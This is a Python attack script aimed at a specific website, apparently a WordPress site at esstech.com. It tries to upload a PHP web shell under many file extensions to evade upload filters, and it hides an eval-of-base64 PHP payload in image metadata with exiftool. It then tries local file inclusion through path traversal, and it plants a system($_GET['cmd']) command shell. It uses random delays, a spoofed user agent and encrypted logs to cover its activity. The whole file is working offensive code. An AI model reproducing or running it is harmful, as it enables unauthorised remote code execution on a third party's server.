import requests
import random
import string
import time
import os
import base64
from cryptography.fernet import Fernet
import urllib3
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def random_filename(extension=".php"):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(10)) + extension

def log_activity(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    with open("exploit_log.txt", "ab") as log_file:
        log_file.write(encrypted_data + b"\n")

def random_delay():
    time.sleep(random.uniform(1, 3))

def retry_request(func, retries=3):
    for attempt in range(retries):
        try:
            return func()
        except requests.exceptions.RequestException as e:
            log_activity(f"Attempt {attempt+1} failed: {e}")
            time.sleep(2)
    print("All attempts failed.")
    return None

def embed_php_in_image(image_path, php_code):
    try:
        encoded_php = "<?php eval(base64_decode('" + base64.b64encode(php_code.encode()).decode() + "')); ?>"
        subprocess.run(["exiftool", f"-Comment={encoded_php}", image_path], check=True)
        print(f"PHP code embedded in {image_path} metadata.")
    except Exception as e:
        print(f"Failed to embed PHP code in image: {e}")

def upload_shell(url, session, shell_path):
    extensions = [".php", ".phtml", ".php5", ".phtm", ".phar", ".txt", ".html", ".shtml", ".jpg"]
    for ext in extensions:
        file_name = random_filename(ext)
        with open(shell_path, 'rb') as file:
            files = {'file': (file_name, file, 'application/octet-stream')}
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            random_delay()
            response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, verify=False))
            
            if response and response.status_code == 200:
                check_url = f"{url}/wp-content/uploads/{file_name}"
                print("Shell uploaded successfully as", file_name, ":", check_url)
                
                # Check if file is accessible
                check_response = session.get(check_url, verify=False)
                if check_response.status_code == 200:
                    print(f"File is accessible at: {check_url}")
                    attempt_lfi(url, file_name)
                    break
                else:
                    print("File was deleted or is inaccessible.")
            else:
                print("Upload failed for", file_name)

def upload_image(url, session, image_path, php_code):
    embed_php_in_image(image_path, php_code)
    with open(image_path, 'rb') as image:
        files = {'file': ('image.jpg', image, 'image/jpeg')}
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        random_delay()
        
        response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, verify=False))
        
        if response and response.status_code == 200:
            check_url = f"{url}/wp-content/uploads/image.jpg"
            print("Image uploaded successfully:", check_url)
        else:
            print("Image upload failed.")

def attempt_lfi(url, file_name):
    lfi_url = f"{url}/index.php?page=../../wp-content/uploads/{file_name}"
    response = retry_request(lambda: requests.get(lfi_url, verify=False))
    
    if response and "Expected Payload Output" in response.text:
        print("LFI exploitation successful!")
    else:
        print("LFI exploitation failed.")

# Execution
url = "https://www.esstech.com"
session = requests.Session()
choice = input("Choose file to upload - (1) Shell (2) Image with PHP in metadata: ")

if choice == "1":
    shell_path = "/sec/root/charon_tool/313.php"
    if os.path.exists(shell_path):
        upload_shell(url, session, shell_path)
    else:
        print("Shell file not found.")
elif choice == "2":
    image_path = "/sec/root/charon_tool/image.jpg"
    php_code = '<?php system($_GET["cmd"]); ?>'
    if os.path.exists(image_path):
        upload_image(url, session, image_path, php_code)
    else:
        print("Image file not found.")
else:
    print("Invalid choice.")
